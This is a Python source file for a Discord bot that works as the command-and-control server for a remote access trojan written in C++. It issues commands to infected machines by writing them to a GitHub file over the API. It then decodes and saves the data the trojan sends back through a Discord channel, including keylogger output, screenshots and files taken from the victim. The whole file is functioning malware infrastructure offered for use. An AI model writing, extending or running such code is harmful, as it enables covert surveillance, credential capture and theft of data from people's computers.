import discord
from discord.ext import commands
import os
import requests
import json
import base64 
import datetime # Used for timestamping files

# --- C2 Configuration (Must match the C++ RAT's configuration) ---
# IMPORTANT: REPLACE THESE PLACEHOLDERS
BOT_TOKEN = "DISCORD_BOT_TOKEN_GOES_HERE" 
TARGET_CHANNEL_ID = 123456789012345678  # Replace with the ID of your C2 Channel (must be an integer)
GITHUB_COMMAND_FILE_URL = "https://api.github.com/repos/L0VE/cmds/contents/cmd.txt" 
GITHUB_TOKEN = "YOUR_GITHUB_PAT_FOR_WRITING_GOES_HERE" # Personal Access Token required to push updates
# Conceptual Webhook URL where the RAT conceptually posts its results:
# NOTE: In a real environment, you'd configure the C++ RAT to POST to this webhook.
CONCEPTUAL_WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL_GOES_HERE" 

# --- Bot Setup ---
# Set command prefix
bot = commands.Bot(command_prefix='!', intents=discord.Intents.all())

# Function to conceptually update the GitHub file content
def update_github_command_file(new_command):
    """
    Sends the new command to the GitHub file via API, replacing its content.
    The C++ RAT will read this raw file content.
    """
    if not GITHUB_TOKEN or GITHUB_TOKEN == "YOUR_GITHUB_PAT_FOR_WRITING_GOES_HERE":
        print("ERROR: GitHub PAT not configured. Cannot update command file.")
        return False, "Error: GitHub PAT missing."

    # --- Step 1: Get the current SHA (needed to update the file) ---
    try:
        headers = {
            "Authorization": f"token {GITHUB_TOKEN}",
            "Accept": "application/vnd.github.v3+json"
        }
        response = requests.get(GITHUB_COMMAND_FILE_URL, headers=headers)
        response.raise_for_status()
        
        file_data = response.json()
        current_sha = file_data['sha']
        
    except requests.exceptions.RequestException as e:
        print(f"Error fetching SHA from GitHub: {e}")
        return False, f"Error: Failed to fetch file SHA ({e})."

    # --- Step 2: Update the file content ---
    # Base64 encode the command content as required by GitHub API
    encoded_content = base64.b64encode(new_command.encode('utf-8')).decode('utf-8')
    
    payload = {
        "message": f"Issued command: {new_command}",
        "content": encoded_content,
        "sha": current_sha
    }

    try:
        response = requests.put(GITHUB_COMMAND_FILE_URL, headers=headers, data=json.dumps(payload))
        response.raise_for_status()
        return True, "Command successfully written to GitHub file."
    except requests.exceptions.RequestException as e:
        print(f"Error updating GitHub file: {e}")
        return False, f"Error: Failed to update file ({e})."


# --- File Handling and Decoding Utility ---

def decode_and_save_file(b64_data, filename):
    """Decodes Base64 data and saves it as a binary file locally."""
    try:
        binary_data = base64.b64decode(b64_data)
        
        # Determine unique filename
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        
        if filename == "sys_log.txt":
            local_name = f"keylog_{timestamp}.log"
        elif filename == "screenshot.bmp":
            local_name = f"screenshot_{timestamp}.bmp"
        else:
            local_name = f"download_{filename}_{timestamp}"

        with open(local_name, 'wb') as f:
            f.write(binary_data)
            
        return True, local_name
    except Exception as e:
        return False, f"Decoding or saving failed: {e}"


# --- Bot Events and Commands ---

@bot.event
async def on_ready():
    """Confirms the bot is connected and ready to accept commands."""
    print(f'Logged in as {bot.user.name} ({bot.user.id})')
    await bot.change_presence(activity=discord.Game(name="Command & Control Ready"))
    
    if not bot.get_channel(TARGET_CHANNEL_ID):
        print(f"ERROR: Channel ID {TARGET_CHANNEL_ID} not found or inaccessible.")


@bot.event
async def on_message(message):
    """Monitors the C2 channel for the RAT's output and automatically handles file decoding."""
    # Ignore messages from the bot itself or outside the C2 channel
    if message.author.id == bot.user.id or message.channel.id != TARGET_CHANNEL_ID:
        await bot.process_commands(message) # Still process commands if they exist
        return

    content = message.content
    
    # Check for the file transfer marker sent by the C++ RAT
    if content.startswith('Screenshot Captured and Encoded.'):
        # Expected format: Screenshot Captured and Encoded. FILE_CONTENT_B64:filename:B64_DATA
        
        # Strip the file info prefix
        data_string = content.split('FILE_CONTENT_B64:', 1)[-1]
        
        # Split into filename and Base64 content
        try:
            filename, b64_data = data_string.split(':', 1)
        except ValueError:
            await message.channel.send("[-] ERROR: Could not parse Base64 file response format.")
            await bot.process_commands(message)
            return

        await message.channel.send(f"[*] AUTO-DECODING: Detected file transfer for `{filename}`.")

        success, local_name = decode_and_save_file(b64_data, filename)
        
        if success:
            await message.channel.send(f"[+] FILE SAVED: Successfully decoded and saved `{filename}` locally as `{local_name}`. Ready for analysis.")
            # Optional: Delete the large Base64 message to keep the channel clean
            # await message.delete() 
        else:
            await message.channel.send(f"[-] AUTO-DECODING FAILED: Could not save file. Error: {local_name}")
    
    # Process other non-file commands (like !issue_cmd or !get_file)
    await bot.process_commands(message)


@bot.command(name='issue_cmd', help='Issues a command to the stealth RAT via GitHub C2.')
async def issue_cmd(ctx, *, command_to_run):
    """
    Listens for '!issue_cmd <command>' and pushes the command to the GitHub file.
    """
    if ctx.channel.id != TARGET_CHANNEL_ID:
        return

    await ctx.send(f"[*] Issuing command: `{command_to_run}` to GitHub C2...")
    
    # Note to the user that file output is now automatic via on_message
    if command_to_run.startswith('get_log') or command_to_run.startswith('screenshot') or command_to_run.startswith('upload'): # Updated to include 'upload'
        await ctx.send("NOTE: File transfer initiated. The output will be automatically decoded and saved when the RAT posts the Base64 data.")

    success, message = update_github_command_file(command_to_run)
    
    if success:
        await ctx.send(f"[+] Command queued. Target should execute within 15-30 seconds. ({message})")
    else:
        await ctx.send(f"[-] FAILED to queue command. Check console for details. ({message})")


@bot.command(name='get_file', help='Decodes a Base64 string received from the RAT and saves it as a local file.')
async def get_file(ctx, filename, *, base64_data):
    """
    The manual fallback for decoding. (Now largely replaced by automatic on_message handling)
    """
    if ctx.channel.id != TARGET_CHANNEL_ID:
        return

    await ctx.send(f"[*] Manually decoding Base64 data for `{filename}`...")
    
    success, local_name = decode_and_save_file(base64_data, filename)

    if success:
        await ctx.send(f"[+] File successfully decoded and saved locally as `{local_name}`.")
    else:
        await ctx.send(f"[-] FAILED to decode Base64 data. Check the string and filename. Error: {local_name}")


# --- Run the Bot ---
try:
    bot.run(BOT_TOKEN)
except Exception as e:
    print(f"FATAL ERROR: Failed to start Discord bot. Check BOT_TOKEN. Error: {e}")